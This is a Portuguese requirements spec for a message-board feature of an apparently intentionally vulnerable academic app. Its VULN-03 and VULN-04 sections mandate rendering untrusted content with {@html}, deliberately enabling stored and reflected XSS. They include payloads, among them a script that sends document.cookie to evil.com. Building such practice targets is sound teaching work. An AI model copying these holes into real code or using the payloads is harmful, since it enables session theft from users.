# Mural

### Requirement: Listar recados

O endpoint `GET /api/mural` DEVE retornar todos os recados, ordenados do mais recente para o mais antigo.

#### Scenario: Listar recados

- **WHEN** GET /api/mural com autenticação
- **THEN** status 200
- **AND** resposta contém array de recados com id, conteudo, autor, criadoEm

### Requirement: Criar recado

O endpoint `POST /api/mural` DEVE criar um recado vinculado ao usuário autenticado.

#### Scenario: Criar recado simples

- **WHEN** POST /api/mural com `{ "conteudo": "Prova adiada para sexta" }`
- **THEN** status 201
- **AND** recado é criado com autor = usuário autenticado

#### Scenario: Recado com formatação HTML

- **WHEN** POST /api/mural com `{ "conteudo": "<b>Importante:</b> entregar trabalho" }`
- **THEN** status 201
- **AND** conteúdo é armazenado com as tags HTML

### Requirement: Renderizar recados com XSS [VULN-03]

O frontend DEVE renderizar o conteúdo dos recados e o nome de exibição do autor usando `{@html}`, permitindo execução de scripts injetados.

#### Scenario: XSS armazenado no conteúdo [VULN-03]

- **WHEN** atacante cria recado com `{ "conteudo": "<script>fetch('https://evil.com?c='+document.cookie)</script>" }`
- **AND** vítima visualiza o mural
- **THEN** script é executado no navegador da vítima
- **AND** cookie de sessão é enviado ao atacante

#### Scenario: XSS via nome de exibição [VULN-03]

- **WHEN** atacante altera seu nomeExibicao para `<img src=x onerror="alert(1)">`
- **AND** atacante posta um recado
- **AND** vítima visualiza o mural
- **THEN** script é executado ao renderizar o nome do autor

### Requirement: XSS DOM na busca [VULN-04]

A página de busca de disciplinas DEVE exibir o termo buscado usando `{@html}`, permitindo XSS refletido via query string.

#### Scenario: XSS refletido na busca [VULN-04]

- **WHEN** vítima acessa URL /busca?q=<script>alert(document.cookie)</script>
- **THEN** termo é renderizado com {@html}
- **AND** script é executado no navegador da vítima

#### Scenario: Link malicioso via engenharia social [VULN-04]

- **WHEN** atacante envia link https://sigacad.edu.br/busca?q=<img src=x onerror="...">
- **AND** vítima clica no link
- **THEN** payload é executado no contexto da sessão da vítima
